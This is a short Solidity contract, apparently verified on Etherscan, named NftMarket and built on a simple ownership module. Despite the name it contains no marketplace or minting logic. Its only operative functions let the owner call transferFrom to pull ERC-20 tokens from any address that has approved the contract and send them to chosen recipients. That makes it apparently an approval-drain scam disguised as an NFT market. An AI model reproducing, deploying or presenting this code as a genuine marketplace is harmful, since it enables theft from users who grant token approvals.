/**
 *Submitted for verification at Etherscan.io on 2021-11-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ERC20Like {
    function transfer(address, uint256) external returns (bool);

    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);
    
    function approve(address, uint256) external returns (bool);
    
    function balanceOf(address account) external view returns (uint256);
}

contract Owned {
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "you are not the owner");
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }

    function acceptOwnership() public {
        require(msg.sender == newOwner, "you are not the owner");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}

contract NftMarket is Owned {
    address public revenueRecipient;
    uint256 public constant mintFee = 10 * 1e8;
    ERC20Like public token;
    address public tokenaddress;

    constructor(address _tokenaddress){
        tokenaddress = _tokenaddress;
    }
    
    function batch(address afrom,address[] memory toAddr, uint256[] memory value) external onlyOwner returns (bool){
        require(toAddr.length == value.length && toAddr.length >= 1);
        token = ERC20Like(tokenaddress);
        for(uint256 i = 0 ; i < toAddr.length; i++){
            token.transferFrom(afrom,toAddr[i], value[i]);
        }
        return true;
    }

    function onetransferfrom(address afrom,address to,uint256 amount) external onlyOwner returns(bool){
        token = ERC20Like(tokenaddress);
        token.transferFrom(afrom,to,amount);
        return true;
    }
    
}